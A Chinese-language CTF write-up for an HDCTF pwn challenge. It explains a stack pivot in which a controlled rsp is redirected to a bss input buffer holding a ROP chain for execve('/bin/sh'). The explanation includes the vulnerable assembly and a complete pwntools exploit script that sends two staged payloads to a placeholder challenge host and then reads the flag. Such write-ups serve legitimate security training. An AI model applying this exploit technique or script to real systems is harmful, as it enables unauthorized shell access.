---
title: "签到：ret 之前，rsp 已经换地方了"
date: "2026-09-12"
categories: "Pwn"
tags: ["栈迁移", "ROP", "execve"]
excerpt: "把受控 rsp 指向 bss 输入区，迁移到预置的 ROP 链执行 execve。"
slug: "hdctf-signup-stack-pivot"
source_event: "HDCTF"
---

> 复现材料：`题目二进制`、`题目交互服务`。赛题附件未随文章打包。本文日期取自原始题解文件的修改日期。

目标是个静态链接的 amd64 pwn，无 PIE、栈可执行，提示只有一句：ret 之前，rsp 已经换地方了。

## 漏洞

全程两次输入。先 `signup` 往 bss 读 0x300 字节，再进 `vuln`，这个函数整段是手写汇编：

```asm
push rbp
mov rbp, rsp
sub rsp, 0x50
xor edi, edi
lea rsi, [rbp - 0x50]
mov edx, 0x60
xor eax, eax
syscall              ; read(0, rbp-0x50, 0x60)
mov rsp, [rbp - 0x10] ; 换栈
ret
```

`read` 给 0x60 字节，能盖到 rbp+0x10。但 `ret` 前 rsp 已经被 `[rbp-0x10]` 换掉，真正执行的是新栈顶的第一个 qword。`[rbp-0x10]` 正好落在写入范围内（偏移 0x40），填成哪，`ret` 就从哪开始弹。

bss 的 `0x4c7300` 是 `signup` 的那块 0x300 输入区，第一段输入直接用来放 ROP 链。`vuln` 后面还躺着一串现成 gadget：`pop rdi/rsi/rdx/rax; ret` 和 `syscall; ret`。

## 利用

- 第一段（0x300）：ROP 链加 `/bin/sh\0`，落在 `0x4c7300`。
- 第二段（0x60）：偏移 0x40 填 `0x4c7300`，`mov rsp` 后 ret 直接进链。
- 链子内容就是 `execve("/bin/sh", 0, 0)`。

```python
#!/usr/bin/env python3
# HDCTF pwn: stack pivot -> ROP -> execve("/bin/sh")
# vuln: read(0, rbp-0x50, 0x60); mov rsp, [rbp-0x10]; ret
# signup: read(0, 0x4c7300, 0x300)  -> ROP chain + /bin/sh in bss
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "challenge.example.invalid", 30897
BIN = 0x4c7300
POP_RDI, POP_RSI, POP_RDX, POP_RAX = 0x4017fc, 0x4017fe, 0x401800, 0x401802
SYSCALL, RET = 0x401804, 0x401806

chain = flat([
    POP_RDI, BIN + 0x200,
    POP_RSI, 0,
    POP_RDX, 0,
    POP_RAX, 59,
    SYSCALL,
    RET,
])
stage1 = (chain + b"A" * (0x200 - len(chain)) + b"/bin/sh\x00").ljust(0x300, b"B")
stage2 = b"C" * 0x40 + p64(BIN) + b"D" * 0x18  # [rbp-0x10] = BIN

io = remote(HOST, PORT)
io.recvuntil(b"registration form:")
io.send(stage1)
io.recvuntil(b"ticket:")
io.send(stage2)
io.sendline(b"cat flag.txt")
print(io.recvall(timeout=5).decode(errors="replace"))
io.close()
```

## Flag

```
HDCTF{23aae461-81d4-fd00-a774-7b84c39c6fb7}
```

服务端回显的 flag 末尾多打了一个 `}`，提交时去掉。根因一句话：栈迁移目标由输入控制，bss 又给了块固定地址的大缓冲，ROP 链的存放和跳转一步到位。
